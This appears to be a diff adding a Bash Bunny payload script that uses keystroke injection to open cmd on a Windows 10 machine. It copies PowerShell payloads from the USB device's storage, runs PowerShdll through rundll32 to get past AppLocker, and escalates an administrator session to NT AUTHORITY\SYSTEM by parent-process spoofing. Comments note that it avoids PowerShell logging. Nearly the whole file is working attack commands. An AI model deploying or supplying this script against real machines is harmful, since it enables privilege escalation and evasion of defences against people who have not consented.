@@ -1,0 +1,93 @@
+#!/bin/bash
+#
+# Title:            Get System Account
+#
+# Description:      Spoofing "NT AUTHORITY\SYSTEM" via parent process using PowerShell and embedded C Sharp
+#
+# Author:           TW-D
+# Version:          1.0
+# Category:         Execution
+# Target:           Microsoft Windows 10
+# Attackmodes:      HID and STORAGE
+#
+# TESTED ON
+# ===============
+# Microsoft Windows 10 Family Version 1903 (PowerShell 5.1)
+# Microsoft Windows 10 Professional Version 20H2 (PowerShell 5.1)
+#
+# REQUIREMENTS
+# ===============
+# The target user must belong to the 'Administrator' group.
+# The target user have 'SeDebugPrivilege' token in 'Administrator' mode (by default).
+#
+# TOOLS
+# ===============
+# https://github.com/p3nt4/PowerShdll
+# https://github.com/decoder-it/psgetsystem
+#
+# STATUS
+# ===============
+# Magenta solid ................................... SETUP
+# Yellow single blink ............................. ATTACK
+# Yellow double blink ............................. STAGE2
+# Yellow triple blink ............................. STAGE3
+# Green 1000ms VERYFAST blink followed by SOLID ... FINISH
+#
+
+######## INITIALIZATION ########
+
+readonly BB_LABEL="BashBunny"
+
+######## SETUP ########
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+######## ATTACK ########
+
+LED ATTACK
+
+RUN WIN "cmd" 
+Q DELAY 5000
+
+LED STAGE2
+
+# Does not use PowerShell for avoid logging
+#
+Q STRING "WMIC Volume WHERE Label=\"${BB_LABEL}\" GET Name | FIND /V \"Name\" 1> .\BB_LABEL"
+Q ENTER
+Q DELAY 1500
+Q STRING "SET /P BB_LABEL=<.\BB_LABEL"
+Q ENTER
+Q DELAY 1500
+Q STRING "DEL /Q .\BB_LABEL && CD /D %BB_LABEL% && CD .\\payloads\\${SWITCH_POSITION}\\ && COPY .\payload.ps1 %USERPROFILE% && COPY .\psgetsys.ps1 %USERPROFILE%"
+Q ENTER
+Q DELAY 1500
+
+LED STAGE3
+
+# Use 'PowerShdll' for AppLocker Bypass
+# -n : Avoid crashes on output
+# -w : Start an interactive console in a new window
+#
+Q STRING "rundll32 .\PowerShdll.dll,main -n -w"
+Q ENTER
+Q DELAY 7000
+Q STRING ".\payload.ps1"
+Q ENTER
+Q DELAY 7000
+Q LEFTARROW
+Q DELAY 1500
+Q ENTER
+Q DELAY 7000
+Q STRING "CD \$env:UserProfile"
+Q ENTER
+Q DELAY 1500
+Q STRING ".\payload.ps1"
+Q ENTER
+
+######## FINISH ########
+
+LED FINISH
